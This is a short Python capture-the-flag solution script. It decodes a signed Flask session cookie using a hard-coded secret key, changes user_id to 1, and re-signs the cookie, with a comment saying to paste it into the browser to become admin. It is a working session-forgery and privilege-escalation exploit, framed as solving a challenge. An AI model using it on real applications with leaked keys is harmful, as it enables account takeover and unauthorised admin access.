#!/usr/bin/env python
from flask.sessions import SecureCookieSessionInterface
from itsdangerous import URLSafeTimedSerializer

## this code was found on github, i only borrowed it to solve this challenge !
## i alsu used this website to decode the old cookie https://www.kirsle.net/wizards/flask-session.cgi
class SimpleSecureCookieSessionInterface(SecureCookieSessionInterface):
	# Override method
	# Take secret_key instead of an instance of a Flask app
	def get_signing_serializer(self, secret_key):
		if not secret_key:
			return None
		signer_kwargs = dict(
			key_derivation=self.key_derivation,
			digest_method=self.digest_method
		)
		return URLSafeTimedSerializer(secret_key, salt=self.salt,
		                              serializer=self.serializer,
		                              signer_kwargs=signer_kwargs)

def decodeFlaskCookie(secret_key, cookieValue):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.loads(cookieValue)

# Keep in mind that flask uses unicode strings for the
# dictionary keys
def encodeFlaskCookie(secret_key, cookieDict):
	sscsi = SimpleSecureCookieSessionInterface()
	signingSerializer = sscsi.get_signing_serializer(secret_key)
	return signingSerializer.dumps(cookieDict)

if __name__=='__main__':
	sk = 'f645e18b63bc9396ad8a2662c1ec762d'
	cookie = '.eJwlj0tqQzEMAO_idRaS9c9lgi3LtBRaeC9Zld49D7qfgZnf9thHnR_t_jxedWuPz9XuzZDUnQ0i1gp2cw8JclboqUVYI4P2skFddKZJRJFCwKR5QYEy8XI1R5oNhM5LoDZ66ErqCZuWOLNXYvou66YCqZnCSNVuLc9jP54_X_V99RByEq0ZvYeM4aQDkEspdggoT3WAWnZ5r7OO_wluf29nCzyA.DyHqxg.5dqjtROf-WWEmV41pIGvkMYBKbQ'
	decodedDict = decodeFlaskCookie(sk, cookie)
	print "[*] Old cookie --> "
	print decodedDict
	decodedDict["user_id"] = u'1'
	new_cookie = encodeFlaskCookie(sk, decodedDict)
	decoded = decodeFlaskCookie(sk, new_cookie)
	print "[*] New cookie -->"
	print decoded
	print "[*] Decoded new cookie -->"
	#copy this new_cookie and change it with your browser current value then click admin button again et Voila you are the admin and you got the flag !
	print new_cookie
